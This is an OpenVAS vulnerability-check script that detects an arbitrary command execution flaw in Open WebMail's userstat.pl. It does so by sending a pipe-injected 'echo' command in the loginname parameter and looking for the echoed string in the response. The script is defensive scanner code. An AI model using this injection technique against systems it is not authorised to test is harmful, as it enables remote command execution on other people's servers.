# OpenVAS Vulnerability Test
# $Id: openwebmail_userstat_command_execution.nasl 3359 2016-05-19 13:40:42Z antu123 $
# Description: Open WebMail userstat.pl Arbitrary Command Execution
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The target is running at least one instance of Open WebMail in which
the userstat.pl component fails to sufficiently validate user input. 
This failure enables remote attackers to execute arbitrary programs on
the target using the privileges under which the web server operates. 
For further information, see :

  http://www.openwebmail.org/openwebmail/download/cert/advisories/SA-04:01.txt";

tag_solution = "Upgrade to Open WebMail version 2.30 20040127 or later.";

if (description) {
  script_id(15529);
  script_version("$Revision: 3359 $");
  script_tag(name:"last_modification", value:"$Date: 2016-05-19 15:40:42 +0200 (Thu, 19 May 2016) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_bugtraq_id(10316);
  script_xref(name:"OSVDB", value:"4201");

  name = "Open WebMail userstat.pl Arbitrary Command Execution";
  script_name(name);
 
  summary = "Checks for Arbitrary Command Execution flaw in Open WebMail's userstat.pl";
  script_summary(summary);
 
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 George A. Theall");

  family = "Gain a shell remotely";
  script_family(family);

  script_dependencies("global_settings.nasl", "openwebmail_detect.nasl");
  script_require_ports("Services/www", 80);

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

host = get_host_name();
port = get_http_port(default:80);

if (!get_port_state(port)) exit(0);
if (debug_level) display("debug: checking for Arbitrary Command Execution flaw in userstat.pl in Open WebMail on ", host, ":", port, ".\n");

# We test whether the hole exists by trying to echo magic (urlencoded
# as alt_magic for http) and checking whether we get it back.
magic = "userstat.pl is vulnerable";
alt_magic = str_replace(string:magic, find:" ", replace:"%20");

# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/openwebmail"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    if (debug_level) display("debug: checking version ", ver, " under ", dir, ".\n");

    # nb: more interesting exploits are certainly possible, but my
    #     concern is in verifying whether the flaw exists and by
    #     echoing magic along with the phrase "has mail" I can
    #     do that.
    url = string(
      dir, 
      "/userstat.pl?loginname=|echo%20'",
      alt_magic,
      "%20has%20mail'"
    );
    if (debug_level) display("debug: retrieving ", url, "...\n");
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if (isnull(res)) exit(0);           # can't connect
    if (debug_level) display("debug: res =>>", res, "<<\n");

    if (egrep(string:res, pattern:magic)) {
      security_message(port);
      exit(0);
    }
  }
}
